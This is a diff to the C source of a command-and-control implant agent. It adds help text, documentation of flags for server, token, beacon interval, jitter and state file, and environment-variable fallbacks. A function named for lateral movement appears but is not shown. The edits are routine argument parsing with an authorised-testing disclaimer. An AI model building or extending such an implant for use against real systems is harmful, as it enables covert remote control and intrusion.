@@ -1,13 +1,29 @@
 /*
  * agent.c — C2 agent, C port (libcurl).
  *
+ * Port of clients/agent.py with identical CLI flags, task types and result
+ * shapes. Wire protocol documented in C2/protocol.md.
+ *
  * Build:
- *   gcc -o agent agent.c -lcurl
+ *   gcc -std=c11 -o agent agent.c -lcurl
  *   # or with debug:
- *   gcc -g -o agent agent.c -lcurl
- * Run:
- *   ./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --verbose
- *   C2_SERVER=... C2_TOKEN=... ./agent
+ *   gcc -g -std=c11 -o agent agent.c -lcurl
+ * Usage:
+ *   ./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN>
+ *   ./agent --server http://127.0.0.1:8000 --token <AGENT_TOKEN> \
+ *       --interval 5 --jitter 2 --verbose
+ *
+ * Environment variables (accepted when the flag is not given):
+ *   C2_SERVER, C2_TOKEN, C2_INTERVAL, C2_JITTER, C2_STATE_FILE, C2_VERBOSE
+ *
+ * Flags:
+ *   --server URL      server base URL (required unless C2_SERVER is set)
+ *   --token TOKEN     shared agent token (required unless C2_TOKEN is set)
+ *   --interval N      heartbeat interval in seconds (default 10, min 1)
+ *   --jitter N        random jitter in seconds added to the interval
+ *   --state FILE      state file persisting the agent id (default ~/.c2agent_c.json)
+ *   --verbose         print activity to stdout
+ *   -h, --help        show this help and exit
  *
  * Only use against systems you own or are authorized to test.
  */
@@ -2504,24 +2520,55 @@ static void task_lateral(const char *args_json, char *output, size_t out_size, i
 int main(int argc, char *argv[]) {
     /* Parse arguments */
     strncpy(g_self_path, argv[0], sizeof(g_self_path) - 1);
+    int help = 0;
+    int interval_given = 0, jitter_given = 0, state_given = 0, verbose_given = 0;
     for (int i = 1; i < argc; i++) {
         if (strcmp(argv[i], "--server") == 0 && i + 1 < argc)
             strncpy(g_server, argv[++i], sizeof(g_server) - 1);
         else if (strcmp(argv[i], "--token") == 0 && i + 1 < argc)
             strncpy(g_token, argv[++i], sizeof(g_token) - 1);
-        else if (strcmp(argv[i], "--interval") == 0 && i + 1 < argc)
+        else if (strcmp(argv[i], "--interval") == 0 && i + 1 < argc) {
             g_interval = atoi(argv[++i]);
-        else if (strcmp(argv[i], "--jitter") == 0 && i + 1 < argc)
+            interval_given = 1;
+        }
+        else if (strcmp(argv[i], "--jitter") == 0 && i + 1 < argc) {
             g_jitter = atoi(argv[++i]);
-        else if (strcmp(argv[i], "--state") == 0 && i + 1 < argc)
+            jitter_given = 1;
+        }
+        else if (strcmp(argv[i], "--state") == 0 && i + 1 < argc) {
             strncpy(g_state_override, argv[++i], sizeof(g_state_override) - 1);
-        else if (strcmp(argv[i], "--verbose") == 0)
+            state_given = 1;
+        }
+        else if (strcmp(argv[i], "--verbose") == 0) {
             g_verbose = 1;
+            verbose_given = 1;
+        }
+        else if (strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "--help") == 0) {
+            help = 1;
+        }
+    }
+
+    if (help) {
+        printf("usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
+        printf("\n");
+        printf("Flags (also settable via C2_SERVER/C2_TOKEN/C2_INTERVAL/C2_JITTER/C2_STATE_FILE/C2_VERBOSE):\n");
+        printf("  --server URL      server base URL (required unless C2_SERVER is set)\n");
+        printf("  --token TOKEN     shared agent token (required unless C2_TOKEN is set)\n");
+        printf("  --interval N      heartbeat interval in seconds (default 10, min 1)\n");
+        printf("  --jitter N        random jitter in seconds added to the interval\n");
+        printf("  --state FILE      state file persisting the agent id (default ~/.c2agent_c.json)\n");
+        printf("  --verbose         print activity to stdout\n");
+        printf("  -h, --help        show this help and exit\n");
+        return 0;
     }
 
     /* Env var fallback */
     if (!g_server[0]) { char *e = getenv("C2_SERVER"); if (e) strncpy(g_server, e, sizeof(g_server) - 1); }
     if (!g_token[0])  { char *e = getenv("C2_TOKEN");  if (e) strncpy(g_token, e, sizeof(g_token) - 1); }
+    if (!interval_given) { char *e = getenv("C2_INTERVAL"); if (e && *e) g_interval = atoi(e); }
+    if (!jitter_given)   { char *e = getenv("C2_JITTER");   if (e && *e) g_jitter = atoi(e); }
+    if (!state_given)    { char *e = getenv("C2_STATE_FILE"); if (e) strncpy(g_state_override, e, sizeof(g_state_override) - 1); }
+    if (!verbose_given) { char *e = getenv("C2_VERBOSE"); if (e && (strcmp(e, "1") == 0 || strcmp(e, "true") == 0)) g_verbose = 1; }
 
     if (!g_server[0] || !g_token[0]) {
         fprintf(stderr, "usage: ./agent --server URL --token TOKEN [--interval N] [--jitter N] [--state FILE] [--verbose]\n");
